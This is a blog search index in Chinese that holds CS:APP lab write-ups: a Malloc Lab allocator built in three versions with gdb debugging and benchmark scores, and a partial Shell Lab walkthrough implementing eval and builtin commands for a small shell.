<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CS:APP-Malloc Lab</title>
    <url>/2023/12/01/CS-APP-Malloc-Lab/</url>
    <content><![CDATA[<p>本实验要求我们实现一个简单的动态存储分配器，主要完成<code>malloc</code>、<code>free</code>和<code>realloc</code>的功能，实现过程要同时兼顾内存利用率和吞吐量。</p>
<p>话不多说，打开电脑，带上键盘，开启实验！<a id="more"></a></p>
<h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a>前置工作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install gcc-multilib</span><br></pre></td></tr></table></figure>

<h2 id="v1-实现"><a href="#v1-实现" class="headerlink" title="v1-实现"></a>v1-实现</h2><p>我们第一个版本主要抄一下教材9.9.12的代码，主要是实现最基本的功能，然后再考虑优化。</p>
<p>在教材的基础之上，我补充了<code>mm_realloc</code>的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span>* bp, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(bp == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(<span class="built_in">size</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">size</span> == (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">0</span>) &amp;&amp; bp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        mm_free(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新块和旧块的部分内容必须相同</span></span><br><span class="line">    <span class="comment">// 相同部分的大小 = min(new_size, old_size)</span></span><br><span class="line">    <span class="comment">// 先申请一个新块，再拷贝，再free旧块</span></span><br><span class="line">    <span class="comment">// 这里所说的size指的是字节数，由于是双字对齐，</span></span><br><span class="line">    <span class="comment">// 因此size必然是8的整数倍，拷贝过程可以一次性拷贝4个字节</span></span><br><span class="line">    <span class="keyword">char</span>* new_bp = mm_malloc(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span>(new_bp == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> copy_size = MIN(<span class="built_in">size</span>, GET_BLOCK_SIZE(HEADER_PTR(bp)));</span><br><span class="line">    <span class="keyword">char</span> *src_ptr = bp, *dst_ptr = new_bp;</span><br><span class="line">    <span class="keyword">size_t</span> finish_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> word_content;</span><br><span class="line">    <span class="keyword">for</span>(; finish_size &lt; copy_size; finish_size += <span class="number">4</span>)&#123;</span><br><span class="line">        word_content = GET_WORD(src_ptr);</span><br><span class="line">        PUT_WORD(dst_ptr, word_content);</span><br><span class="line">        dst_ptr += <span class="number">4</span>;</span><br><span class="line">        src_ptr += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 释放旧块</span></span><br><span class="line">    mm_free(bp);</span><br><span class="line">    <span class="keyword">return</span> new_bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整代码可以在<a href="https://github.com/YaleXin/CS-APP3e-Labs/blob/main/Malloc-Lab/mm-v1.c" target="_blank" rel="noopener">【仓库】</a>获得</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>官网给的测试trace是少的，从pdf也可以看得出来，漏了个traces文件夹，该文件夹可以在我的<a href="https://github.com/YaleXin/CS-APP3e-Labs/tree/main/Malloc-Lab/traces" target="_blank" rel="noopener">【仓库】</a>获得。</p>
<p>堆是往高地址增长的，因此下一块的地址比前一块的地址大，且脚部地址比头部地址大。</p>
<p>编写过程中，有的时候需要借助<code>gdb</code>进行调试，我们要在<code>Makefile</code>中修改为DEBUG模式并取消任何优化：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CFLAGS = -Wall -g -O0 -m32</span><br></pre></td></tr></table></figure>

<p>调试步骤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ./mdriver</span><br><span class="line">// 根据你要的进行下断点</span><br><span class="line">// 如 break 文件名:行号</span><br><span class="line">// 如 break 文件名:函数名</span><br><span class="line">break mdriver.c:592</span><br><span class="line">break mm.c:111</span><br><span class="line">break mm.c:mm_init</span><br><span class="line">// 运行</span><br><span class="line">run -V  -f short1-bal.rep</span><br><span class="line">run -V -f amptjp-bal.rep </span><br><span class="line">run -V -f random.rep </span><br><span class="line">// 查看指定内存的8个单元</span><br><span class="line">x /8xh 0xf67ff018</span><br><span class="line">// 查看调用堆栈</span><br><span class="line">backtrace</span><br><span class="line">// 条件断点：</span><br><span class="line">break mm.c:mm_realloc if size == 8</span><br></pre></td></tr></table></figure>

<p>我们也可以写一个打印空闲链表的函数，用于查看空闲链表：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_free_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* bp = heap_listp;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----- free list -----\n"</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"block: %d\n"</span>, cnt++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\theader ptr: %p, size: %d, alloc: %d\n"</span>, HEADER_PTR(bp), GET_BLOCK_SIZE(HEADER_PTR(bp)), GET_BLOCK_ALLOC(HEADER_PTR(bp)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tfooter ptr: %p, size: %d, alloc: %d\n\n"</span>, FOOTER_PTR(bp), GET_BLOCK_SIZE(FOOTER_PTR(bp)), GET_BLOCK_ALLOC(FOOTER_PTR(bp)));</span><br><span class="line">        bp = NEXT_BLOCK_PAYLOAD_PTR(bp);</span><br><span class="line">    &#125; <span class="keyword">while</span> (GET_BLOCK_SIZE(HEADER_PTR(bp)) &gt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>mm.h</code>中申明该函数，我们在调试<code>mdriver.c</code>的时候就可以方便调用<code>call print_free_list()</code>了。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mdriver -V -t .&#x2F;traces</span><br><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.006620   860</span><br><span class="line"> 1       yes   99%    5848  0.005870   996</span><br><span class="line"> 2       yes   99%    6648  0.010324   644</span><br><span class="line"> 3       yes  100%    5380  0.007445   723</span><br><span class="line"> 4       yes   66%   14400  0.000132108679</span><br><span class="line"> 5       yes   91%    4800  0.006580   729</span><br><span class="line"> 6       yes   92%    4800  0.006283   764</span><br><span class="line"> 7       yes   55%   12000  0.148051    81</span><br><span class="line"> 8       yes   51%   24000  0.256491    94</span><br><span class="line"> 9       yes   27%   14401  0.168535    85</span><br><span class="line">10       yes   34%   14401  0.008131  1771</span><br><span class="line">Total          74%  112372  0.624462   180</span><br><span class="line"></span><br><span class="line">Perf index &#x3D; 44 (util) + 12 (thru) &#x3D; 56&#x2F;100</span><br></pre></td></tr></table></figure>

<p>56分，比较一般，这是<strong>隐式空闲链表+首次匹配</strong></p>
<h2 id="v2-实现"><a href="#v2-实现" class="headerlink" title="v2-实现"></a>v2-实现</h2><p>由于我们使用的是隐式空闲链表，使得首次分配的分配时间为块总数的线性时间，我们可以使用显性空闲链表，把首次分配降到空闲块数量的线性时间，使用LIFO的方式维护链表。</p>
<p>此外，由于我们使用了显性空闲链表，最小的空闲块变大了，<strong>要至少能够装下前驱指针后后继指针</strong>，我们在分割空闲块的时候要注意这点。</p>
<p>原先用于对齐的那个内存单元可以用于保存第一个空闲块的地址。</p>
<p>下面的函数便于调试</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_free_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* bp = heap_listp;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 打印所有块</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----- block list -----\n"</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"block: %d\n"</span>, cnt++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\theader ptr: %p, size: %d, alloc: %d\n"</span>, HEADER_PTR(bp), GET_BLOCK_SIZE(HEADER_PTR(bp)), GET_BLOCK_ALLOC(HEADER_PTR(bp)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tfooter ptr: %p, size: %d, alloc: %d\n\n"</span>, FOOTER_PTR(bp), GET_BLOCK_SIZE(FOOTER_PTR(bp)), GET_BLOCK_ALLOC(FOOTER_PTR(bp)));</span><br><span class="line">        bp = NEXT_BLOCK_PAYLOAD_PTR(bp);</span><br><span class="line">    &#125; <span class="keyword">while</span> (GET_BLOCK_SIZE(HEADER_PTR(bp)) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n===== free list =====\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\tfirst free block ptr:%p\n"</span>, GET_WORD((<span class="keyword">char</span> *)(heap_listp) - <span class="number">2</span> * WSIZE));</span><br><span class="line">    <span class="comment">// 打印所有空闲块</span></span><br><span class="line">    <span class="comment">// 获取第一个空闲块地址</span></span><br><span class="line">    <span class="keyword">char</span> *first_free_block_bp = GET_WORD((<span class="keyword">char</span> *)(heap_listp) - <span class="number">2</span> * WSIZE);</span><br><span class="line">    bp = first_free_block_bp;</span><br><span class="line">    <span class="keyword">for</span>(;bp != <span class="literal">NULL</span>;bp = GET_WORD(SUCC_PTR(bp)))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"block: %d\n"</span>, cnt++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\theader ptr: %p, size: %d, alloc: %d\n"</span>, HEADER_PTR(bp), GET_BLOCK_SIZE(HEADER_PTR(bp)), GET_BLOCK_ALLOC(HEADER_PTR(bp)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tpred block bp: %p\n"</span>, GET_WORD(PRED_PTR(bp)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tsucc block bp: %p\n"</span>, GET_WORD(SUCC_PTR(bp)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tfooter ptr: %p, size: %d, alloc: %d\n\n"</span>, FOOTER_PTR(bp), GET_BLOCK_SIZE(FOOTER_PTR(bp)), GET_BLOCK_ALLOC(FOOTER_PTR(bp)));</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Results <span class="keyword">for</span> mm <span class="built_in">malloc</span>:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> <span class="number">0</span>       yes   <span class="number">89</span>%    <span class="number">5694</span>  <span class="number">0.001498</span>  <span class="number">3800</span></span><br><span class="line"> <span class="number">1</span>       yes   <span class="number">92</span>%    <span class="number">5848</span>  <span class="number">0.001231</span>  <span class="number">4751</span></span><br><span class="line"> <span class="number">2</span>       yes   <span class="number">94</span>%    <span class="number">6648</span>  <span class="number">0.001989</span>  <span class="number">3342</span></span><br><span class="line"> <span class="number">3</span>       yes   <span class="number">96</span>%    <span class="number">5380</span>  <span class="number">0.001337</span>  <span class="number">4023</span></span><br><span class="line"> <span class="number">4</span>       yes   <span class="number">66</span>%   <span class="number">14400</span>  <span class="number">0.000198</span> <span class="number">72727</span></span><br><span class="line"> <span class="number">5</span>       yes   <span class="number">86</span>%    <span class="number">4800</span>  <span class="number">0.005451</span>   <span class="number">881</span></span><br><span class="line"> <span class="number">6</span>       yes   <span class="number">85</span>%    <span class="number">4800</span>  <span class="number">0.005552</span>   <span class="number">865</span></span><br><span class="line"> <span class="number">7</span>       yes   <span class="number">55</span>%   <span class="number">12000</span>  <span class="number">0.046197</span>   <span class="number">260</span></span><br><span class="line"> <span class="number">8</span>       yes   <span class="number">51</span>%   <span class="number">24000</span>  <span class="number">0.216260</span>   <span class="number">111</span></span><br><span class="line"> <span class="number">9</span>       yes   <span class="number">26</span>%   <span class="number">14401</span>  <span class="number">0.116903</span>   <span class="number">123</span></span><br><span class="line"><span class="number">10</span>       yes   <span class="number">34</span>%   <span class="number">14401</span>  <span class="number">0.005556</span>  <span class="number">2592</span></span><br><span class="line">Total          <span class="number">70</span>%  <span class="number">112372</span>  <span class="number">0.402172</span>   <span class="number">279</span></span><br><span class="line"></span><br><span class="line">Perf index = <span class="number">42</span> (util) + <span class="number">19</span> (thru) = <span class="number">61</span>/<span class="number">100</span></span><br></pre></td></tr></table></figure>

<p><strong>显示空闲链表+首次匹配</strong>，看来提升不大。吞吐量上来了，利用率竟然下降了</p>
<p>完整代码可以在<a href="https://github.com/YaleXin/CS-APP3e-Labs/blob/main/Malloc-Lab/mm-v2.c" target="_blank" rel="noopener">【仓库】</a>获得</p>
<h2 id="v3-实现"><a href="#v3-实现" class="headerlink" title="v3-实现"></a>v3-实现</h2><p><strong>显示空闲链表+首次匹配+分离适配</strong></p>
<p>在一开始的时候申请9个字的空间，分别用于存放不同<strong>大小类</strong>的头指针，划分的方式是根据2的幂来划分。</p>
<blockquote>
<p>为什么是9个？实际上是为了对齐，即满足8*k+1即可，k是正整数</p>
</blockquote>
<p>第一个指针指向块大小是4096以上（包含4096）的，第二个指向2048（包含2048）到4096的，以此类推，最后的指向大小低于32的（不包括32）。</p>
<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   98%    5694  0.000325 17493</span><br><span class="line"> 1       yes   94%    5848  0.000378 15491</span><br><span class="line"> 2       yes   98%    6648  0.000410 16234</span><br><span class="line"> 3       yes   99%    5380  0.000353 15258</span><br><span class="line"> 4       yes   66%   14400  0.000441 32616</span><br><span class="line"> 5       yes   87%    4800  0.002970  1616</span><br><span class="line"> 6       yes   85%    4800  0.002823  1700</span><br><span class="line"> 7       yes   55%   12000  0.014242   843</span><br><span class="line"> 8       yes   51%   24000  0.062740   383</span><br><span class="line"> 9       yes   30%   14401  0.118283   122</span><br><span class="line">10       yes   45%   14401  0.006070  2372</span><br><span class="line">Total          73%  112372  0.209035   538</span><br><span class="line"></span><br><span class="line">Perf index &#x3D; 44 (util) + 36 (thru) &#x3D; 80&#x2F;100</span><br></pre></td></tr></table></figure>

<p>这次吞吐量提升巨大！</p>
<p>下面的函数便于调试</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_free_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* bp = heap_listp;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 打印所有块</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----- block list -----\n"</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"block: %d\n"</span>, cnt++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\theader ptr: %p, size: %d, alloc: %d\n"</span>, HEADER_PTR(bp), GET_BLOCK_SIZE(HEADER_PTR(bp)), GET_BLOCK_ALLOC(HEADER_PTR(bp)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tfooter ptr: %p, size: %d, alloc: %d\n\n"</span>, FOOTER_PTR(bp), GET_BLOCK_SIZE(FOOTER_PTR(bp)), GET_BLOCK_ALLOC(FOOTER_PTR(bp)));</span><br><span class="line">        bp = NEXT_BLOCK_PAYLOAD_PTR(bp);</span><br><span class="line">    &#125; <span class="keyword">while</span> (GET_BLOCK_SIZE(HEADER_PTR(bp)) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)&#123;</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n#### free list [%d-%d) ####\n"</span>, <span class="number">1</span> &lt;&lt; (i + <span class="number">4</span>),<span class="number">1</span> &lt;&lt; (i + <span class="number">5</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tfirst free block ptr:%p\n"</span>, GET_WORD((<span class="keyword">char</span> *)(heap_listp) - <span class="number">2</span> * WSIZE - i * WSIZE));</span><br><span class="line">        <span class="comment">// 打印所有空闲块</span></span><br><span class="line">        <span class="comment">// 获取第一个空闲块地址</span></span><br><span class="line">        <span class="keyword">char</span> *first_free_block_bp = GET_WORD((<span class="keyword">char</span> *)(heap_listp) - <span class="number">2</span> * WSIZE - i * WSIZE);</span><br><span class="line">        bp = first_free_block_bp;</span><br><span class="line">        <span class="keyword">for</span>(;bp != <span class="literal">NULL</span>;bp = GET_WORD(SUCC_PTR(bp)))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"block: %d\n"</span>, cnt++);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\theader ptr: %p, size: %d, alloc: %d\n"</span>, HEADER_PTR(bp), GET_BLOCK_SIZE(HEADER_PTR(bp)), GET_BLOCK_ALLOC(HEADER_PTR(bp)));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\tpred block bp: %p\n"</span>, GET_WORD(PRED_PTR(bp)));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\tsucc block bp: %p\n"</span>, GET_WORD(SUCC_PTR(bp)));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\tfooter ptr: %p, size: %d, alloc: %d\n\n"</span>, FOOTER_PTR(bp), GET_BLOCK_SIZE(FOOTER_PTR(bp)), GET_BLOCK_ALLOC(FOOTER_PTR(bp)));</span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整代码可以在<a href="https://github.com/YaleXin/CS-APP3e-Labs/blob/main/Malloc-Lab/mm-v3.c" target="_blank" rel="noopener">【仓库】</a>获得</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其实所谓的堆管理器，就是在用户空间指定的一段区域内（堆开始和堆结束之间），维护一段一段内存区域（即所谓的块）的空闲与否，当有新的需求无法满足时，再向操作系统请求对堆进行缩小或者扩展，因此当我们堆中存在空闲块的时候，在操作系统看来，该程序占用的内存比实际占用的要大。</p>
<p>当然后面还可以继续在各种细节优化，例如采用下次匹配、延迟合并和采用红黑树等策略，但是我不想再继续和gdb打交道了，我表示再也不想看到gdb了！</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>内存管理</tag>
        <tag>GDB</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP-Shell Lab</title>
    <url>/2023/11/14/CS-APP-Shell-Lab/</url>
    <content><![CDATA[<h2 id="总体要求"><a href="#总体要求" class="headerlink" title="总体要求"></a>总体要求</h2><p>实现一个小小的<code>shell</code>程序，涉及进程调度，信号处理，并发处理的知识，需要掌握教材第8章。</p>
<p>话不多说，打开电脑，带上键盘，开启实验！<a id="more"></a></p>
<h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><p>源文件已经帮我们实现了一部分函数，需要我们完成剩余的函数：</p>
<ul>
<li><p><code>eval</code>：主要用于解析和解释命令行（70行左右）</p>
</li>
<li><p><code>builtin_cmd</code>：识别并解释内置命令：quit、fg、bg 和 jobs（25行左右）</p>
</li>
<li><p><code>do_bgfg</code>: 实现内置命令<code>bg</code>和<code>fg</code>. [50 行左右] </p>
</li>
<li><p><code>waitfg</code>: 等待前台任务完成. [20 行左右] </p>
</li>
<li><p><code>sigchld_handler</code>: 捕捉SIGCHILD 信号. 80 行左右] </p>
</li>
<li><p><code>sigint_handler</code>: 捕捉SIGINT (ctrl-c) 信号. [15 行左右] </p>
</li>
<li><p><code>sigtstp_handler</code>: 捕捉SIGTSTP (ctrl-z) 信号. [15 行左右]</p>
</li>
</ul>
<p>对于输入到命令行中的字符串，第一个单词要么是内置命令，要么是可执行文件路径。</p>
<p>如果是内置命令，则在当前进程中执行；</p>
<p>如果是可执行文件路径，则forks一个子进程，并在子进程中执行相应程序。</p>
<p>我们称解释该字符串过程创造的子进程称为作业job，通常一个作业由多个子进程组成。</p>
<p>如果字符串以<code>&amp;</code>结束，则该作业以后台方式运行，意味着shell程序不等待作业结束，而直接打印提示符等待输入下一条命令。</p>
<p>否则，该作业以前台方式运行，等待该命令执行完毕，再打印提示符等待输入下一条命令。</p>
<p>Unix shell 支持作业控制概念，允许我们将作业在前台后台之间切换，改变进程状态（运行，停止，终止）。</p>
<p>输入CTRL-C将发送SIGINT信号到每一个前台作业中，默认情况下，收到SIGINT信号的进程会被终止。</p>
<p>输入CTRL-Z将发送SIGTSTP信号到每一个前台作业中，默认情况下，收到SIGTSTP信号的进程会被停止，停止状态下，可以接收来自其他进程的SIGCONT信号，从而继续运行。</p>
<p>内置命令：</p>
<ul>
<li>jobs：列出正在运行和停止的后台作业</li>
<li>bg <job>：将一个停止状态的后台作业变为运行的后台作业</job></li>
<li>fg <job>：将一个停止状态或者运行的后台作业变为运行的前台作业</job></li>
<li>kill <job>：终止作业</job></li>
</ul>
<h2 id="tsh"><a href="#tsh" class="headerlink" title="tsh"></a>tsh</h2><ul>
<li><p>提示符为”tsh&gt; “</p>
</li>
<li><p>当输入的第一个单词是内置命令时，tsh应该立即执行并等待下一个命令输入，否则把第一个单词作为可执行文件路径，并在初始化后的子进程中加载并运行可执行文件</p>
</li>
<li><p>tsh不必支持管道（|）或者I/O（&gt;和&lt;）</p>
</li>
<li><p>输入CTRL-C（CTRL-Z）时应发送SIGINT（SIGTSTP）信号到当前前台作业以及该作业的所有子进程（例如它fork出来的子进程），如果没有前台作业，则不会造成任何影响。</p>
</li>
<li><p>如果字符串以<code>&amp;</code>结束，则该作业以后台方式运行，否则，在前台运行</p>
</li>
<li><p>每个作业，可以被进程ID或者作业ID识别。“%5”表示作业ID，“5”表示进程ID</p>
</li>
<li><p>tsh需要支持以下命令：</p>
<ul>
<li>quit：退出shell</li>
<li>jobs：列出所有后台作业</li>
<li>bg <job>：发送SIGCONT信号，重启并在后台运行作业，<job>可以是PID（进程ID）或者JID（作业ID）</job></job></li>
<li>fg <job>：发送SIGCONT信号，重启并在前台运行作业，<job>可以是PID（进程ID）或者JID（作业ID）</job></job></li>
</ul>
</li>
<li><p>tsh应该回收所有僵尸子进程，如果有作业因为接收到一个它没有捕捉到的信号而终止，那么 tsh 就应该识别这一事件，并打印一条包含该作业 PID 和违规信号描述的信息。</p>
</li>
</ul>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>二话不说，参照P525即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span>* cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* argv[MAXARGS];</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> bg;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 忽略空白行</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果不是内置命令</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 子进程</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s: Command not found.\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 父进程等待前台作业停止</span></span><br><span class="line">        <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">            <span class="keyword">int</span> status;</span><br><span class="line">            <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                unix_error(<span class="string">"waitfg: waipid error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d %s"</span>, pid, cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make rtest01</span><br><span class="line">make test01</span><br></pre></td></tr></table></figure>

<h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>在原先的基础上增加对内置命令的识别，我们参照P525的，修改下面的函数即可：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"jobs"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"kill"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"&amp;"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"quit"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make rtest02</span><br><span class="line">make test02</span><br></pre></td></tr></table></figure>

<h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>做完02的测试，实际上03的也通过了</p>
<h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>运行测试，我们发现，不一样的地方在于输出不同，我们要先输出当前作业的ID，再输出进程ID，再输出该命令。</p>
<p>主要修改eval函数：</p>
